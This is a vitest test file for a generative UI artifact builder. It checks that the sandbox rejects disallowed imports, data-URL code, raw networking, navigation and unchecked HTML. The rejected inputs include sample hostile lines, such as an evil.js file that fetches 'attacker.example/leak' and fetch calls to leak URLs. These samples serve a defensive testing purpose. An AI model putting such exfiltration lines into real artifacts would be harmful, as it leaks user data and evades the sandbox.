import { mkdtemp, readFile, rm } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import { buildArtifact } from '../src/artifacts/builder.ts'
import type { ArtifactVersion } from '../src/artifacts/types.ts'

const roots: string[] = []
afterEach(async () => {
  await Promise.all(roots.splice(0).map(root => rm(root, { recursive: true, force: true })))
})

function version(main: string, extra: ArtifactVersion['files'] = []): ArtifactVersion {
  return {
    id: 'v-00000000-0000-0000-0000-000000000000',
    artifactId: 'build-app',
    createdAt: new Date(0).toISOString(),
    summary: 'test',
    files: [{ path: 'src/main.tsx', content: main }, ...extra],
    requirements: [],
    capabilities: [],
    status: 'candidate',
    evidence: { checkedAt: new Date(0).toISOString(), build: 'failed', browser: 'not-run', diagnostics: [], notes: [] },
  }
}

async function dist(): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), 'dsh-genui-build-'))
  roots.push(root)
  return root
}

describe('buildArtifact', () => {
  it('bundles multi-file React code and the virtual SDK', async () => {
    const output = await dist()
    const result = await buildArtifact(version(
      `import React from 'react'; import { createRoot } from 'react-dom/client'; import { App } from './App'; createRoot(document.body).render(<App />)`,
      [{ path: 'src/App.tsx', content: `import { useArtifactState } from '@dsh-genui/sdk'; export const App = () => { const [n] = useArtifactState('n', 0); return <button>{n}</button> }` }],
    ), output)
    expect(result.ok).toBe(true)
    const bundle = await readFile(join(output, 'app.js'), 'utf8')
    expect(bundle).toContain('useArtifactState')
    expect(bundle).toContain("source: 'dsh-genui'")
    expect(bundle).toContain("type: 'ready'")
    expect(bundle).toContain("type === 'ready-request'")
    expect(bundle).toContain('globalThis.__dshGenuiReady) postGenuiReady()')
    expect(bundle).toContain('root.childNodes.length === 0')
    expect(bundle).toContain("type: 'runtime-error'")
    expect(bundle).toContain("'interactive' : 'startup'")
    expect(bundle).toContain("'data-ds-light-theme'")
    expect(bundle).toContain('stateWriteQueues')
    expect(bundle).toContain('__dshGenuiBridge')
    expect(bundle).not.toContain('GenUI capability token is missing')
    expect(bundle).not.toContain("authorization: 'Bearer '")
  }, 15_000)

  it('rejects imports outside the artifact allowlist', async () => {
    const result = await buildArtifact(version(`import fs from 'node:fs'; console.log(fs)`), await dist())
    expect(result.ok).toBe(false)
    expect(result.diagnostics.map(item => item.text).join('\n')).toContain('not allowed')
  })

  it('rejects executable data URL imports', async () => {
    const result = await buildArtifact(version(`import 'data:text/javascript,globalThis.compromised%3Dtrue'`), await dist())
    expect(result.ok).toBe(false)
    expect(result.diagnostics.map(item => item.text).join('\n')).toContain('Data URL imports are not allowed')
  })

  it('returns parse diagnostics instead of throwing', async () => {
    const result = await buildArtifact(version('const broken = ('), await dist())
    expect(result.ok).toBe(false)
    expect(result.diagnostics.some(item => item.severity === 'error')).toBe(true)
  })

  it('rejects user controls that cannot be read on the next turn', async () => {
    const result = await buildArtifact(version(`
      import React, { useState } from 'react'
      import { createRoot } from 'react-dom/client'
      function App() {
        const [light, setLight] = useState(40)
        return <input aria-label="Light" type="range" value={light} onChange={event => setLight(Number(event.target.value))} />
      }
      createRoot(document.body).render(<App />)
    `), await dist())
    expect(result.ok).toBe(false)
    expect(result.diagnostics.map(item => item.text).join('\n')).toContain('useArtifactState')
  })

  it('accepts typed task state for user controls', async () => {
    const result = await buildArtifact(version(`
      import React from 'react'
      import { createRoot } from 'react-dom/client'
      import { useArtifactState } from '@dsh-genui/sdk'
      function App() {
        const [settings, setSettings] = useArtifactState<{ light: number }>('settings', { light: 40 })
        return <input aria-label="Light" type="range" value={settings.light} onChange={event => setSettings({ light: Number(event.target.value) })} />
      }
      createRoot(document.getElementById('root')!).render(<App />)
    `), await dist())
    expect(result.ok).toBe(true)
  })

  it.each([
    {
      name: 'raw fetch',
      source: `fetch('https://example.com/private')`,
      diagnostic: 'raw browser networking APIs',
    },
    {
      name: 'direct navigation',
      source: `window.location.href = 'https://example.com/leak'`,
      diagnostic: 'cannot navigate browsing contexts',
    },
    {
      name: 'navigable markup',
      source: `const link = <a href="https://example.com/leak">Leave</a>`,
      diagnostic: 'cannot create navigable links',
    },
    {
      name: 'unchecked HTML',
      source: `const markup = { __html: '<p>unsafe</p>' }; const view = <main dangerouslySetInnerHTML={markup} />`,
      diagnostic: 'cannot inject unchecked HTML',
    },
  ])('rejects $name outside the SDK boundary', async ({ source, diagnostic }) => {
    const result = await buildArtifact(version(`
      import React from 'react'
      import { createRoot } from 'react-dom/client'
      ${source}
      function App() { return <main>Blocked source</main> }
      createRoot(document.getElementById('root')!).render(<App />)
    `), await dist())
    expect(result.ok).toBe(false)
    expect(result.diagnostics.map(item => item.text).join('\n')).toContain(diagnostic)
  })

  it('applies the sandbox source contract to executable files outside src', async () => {
    const result = await buildArtifact(version(
      `import '../public/evil.js'; import React from 'react'; import { createRoot } from 'react-dom/client'; createRoot(document.getElementById('root')!).render(<main>Blocked import</main>)`,
      [{ path: 'public/evil.js', content: `fetch('https://attacker.example/leak')` }],
    ), await dist())
    expect(result.ok).toBe(false)
    expect(result.diagnostics).toEqual(expect.arrayContaining([
      expect.objectContaining({ file: 'public/evil.js', text: expect.stringContaining('raw browser networking APIs') }),
    ]))
  })
})
